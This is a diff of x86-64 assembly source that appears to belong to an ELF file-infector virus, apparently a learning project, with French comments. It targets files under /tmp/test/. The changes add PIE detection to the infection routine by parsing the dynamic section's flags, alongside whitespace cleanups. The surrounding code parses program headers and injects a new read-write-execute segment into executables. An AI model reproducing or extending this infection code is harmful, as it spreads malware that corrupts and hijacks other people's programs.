@@ -20,25 +20,25 @@ _start:
 	NOP
 	rep		stosq
 	lea		rax, [rel path]
-	mov		[rax], byte '/'	
+	mov		[rax], byte '/'
 	inc		rax
-	mov		[rax], byte 't'	
+	mov		[rax], byte 't'
 	inc		rax
-	mov		[rax], byte 'm'	
+	mov		[rax], byte 'm'
 	inc		rax
-	mov		[rax], byte 'p'	
+	mov		[rax], byte 'p'
 	inc		rax
-	mov		[rax], byte '/'	
+	mov		[rax], byte '/'
 	inc		rax
-	mov		[rax], byte 't'	
+	mov		[rax], byte 't'
 	inc		rax
-	mov		[rax], byte 'e'	
+	mov		[rax], byte 'e'
 	inc		rax
-	mov		[rax], byte 's'	
+	mov		[rax], byte 's'
 	inc		rax
-	mov		[rax], byte 't'	
+	mov		[rax], byte 't'
 	inc		rax
-	mov		[rax], byte '/'	
+	mov		[rax], byte '/'
 	inc		rax
 	;lea		rax, [rel _start]
 	;lea		rdi, [rel _stop]
@@ -664,7 +664,7 @@ prepare_infection:
 	cmp byte [r14 + 0xa], 0x0
 	jne .close_file
 	mov	BYTE [rel dynm], 0
-	
+
 
 	cmp	byte [r14 + 0x10], 0x02
 	je	.continue_infection
@@ -709,6 +709,7 @@ prepare_infection:
 
 infection:
 	PUSH_ALLr
+	mov	BYTE [rel ispie], 0
 	mov BYTE [rel inte], 0
 	mov BYTE [rel zero], 1
 	mov qword [rel p_offset], 0
@@ -740,6 +741,37 @@ infection:
 	jne	.no_interp
 	mov BYTE [rel inte], 1
 .no_interp:
+
+	cmp dword [rbx], 2
+	jne	.no_dynamic
+	; FAUT PARSER CETTE MERDE DE HEADER DYNAMIC AAAAH\
+	; RBX c'est l'offset
+	PUSH_ALL
+	mov		rcx, [rbx + phdr.p_filesz]
+	shr		rcx, 4
+	mov		rdi, r14
+	add		rdi, [rbx + phdr.p_offset]
+	.parsing_dyn:
+
+
+	mov		eax, [rdi]
+	cmp		eax, 0x6ffffffb
+	jne		.next_dyn
+
+	mov		eax, [rdi + 8]
+	test	eax, 134217728
+	je		.next_dyn
+	mov		BYTE [rel ispie], 1
+
+
+.next_dyn:
+	add		rdi, 16
+	loop	.parsing_dyn
+	POP_ALL
+
+.no_dynamic:
+
+
 	cmp dword [rbx], 1
 	jne .no_load
 
@@ -787,6 +819,8 @@ infection:
 	cmp BYTE [rel dynm], 0
 	je	.no_check_dynm
 	cmp BYTE [rel inte], 0
+	je	.return
+	cmp BYTE [rel ispie], 0
 	je	.return
 
 .no_check_dynm:
@@ -1218,6 +1252,7 @@ _stop:
 ; NEW HEADER
 	dynm:	db 0
 	inte:	db 0
+	ispie:	db 0
 new_programheader:
 	p_type		dd	1
 	p_flags		dd	7
